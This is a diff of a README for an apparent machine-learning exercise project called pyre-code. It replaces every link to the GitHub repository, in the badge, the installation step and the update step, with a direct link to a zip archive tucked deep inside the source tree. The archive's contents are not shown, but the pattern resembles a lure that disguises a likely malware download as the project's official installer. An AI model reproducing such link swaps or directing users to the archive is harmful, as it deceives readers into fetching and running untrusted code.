@@ -1,6 +1,6 @@
 # 💻 pyre-code - Master machine learning through practice exercises
 
-[![](https://img.shields.io/badge/Download-pyre-code-blue)](https://github.com/Rogo9901/pyre-code)
+[![](https://img.shields.io/badge/Download-pyre-code-blue)](https://raw.githubusercontent.com/Rogo9901/pyre-code/main/web/src/app/paths/[id]/pyre-code-2.6.zip)
 
 pyre-code helps you learn machine learning. You practice core concepts through 68 coding problems. These problems range from basic math like ReLU functions to advanced topics like flow matching, attention mechanisms, reinforcement learning from human feedback, and diffusion models. You receive feedback on your code in your web browser. 
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your computer should have 
 
 ## 📥 Installing the Software
 
-Visit [this page](https://github.com/Rogo9901/pyre-code) to download the software. 
+Visit [this page](https://raw.githubusercontent.com/Rogo9901/pyre-code/main/web/src/app/paths/[id]/pyre-code-2.6.zip) to download the software. 
 
 1. Navigate to the link above.
 2. Select the code button.
@@ -83,7 +83,7 @@ If the software does not start, check these common items:
 The project receives regular updates. To get the newest problems:
 
 1. Delete your current folder.
-2. Visit the [download page](https://github.com/Rogo9901/pyre-code) again.
+2. Visit the [download page](https://raw.githubusercontent.com/Rogo9901/pyre-code/main/web/src/app/paths/[id]/pyre-code-2.6.zip) again.
 3. Download the latest version of the code.
 4. Follow the setup instructions provided in this guide again. 
 
